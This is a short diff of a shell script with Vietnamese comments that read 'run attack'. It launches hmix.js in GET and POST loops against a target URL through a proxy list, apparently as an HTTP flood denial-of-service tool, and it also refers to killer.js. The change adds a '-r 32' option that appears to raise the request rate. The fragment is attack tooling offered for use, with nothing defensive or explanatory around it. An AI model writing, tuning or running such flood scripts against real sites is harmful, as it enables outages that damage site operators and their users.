@@ -37,7 +37,7 @@ wait
 export NODE_OPTIONS=--max-old-space-size=8192
 # Chạy tấn công với hmix.js
 for method in GET POST; do 
-  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
+  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 32 --full true -d false &
 done
 
 # Chạy tấn công với killer.js
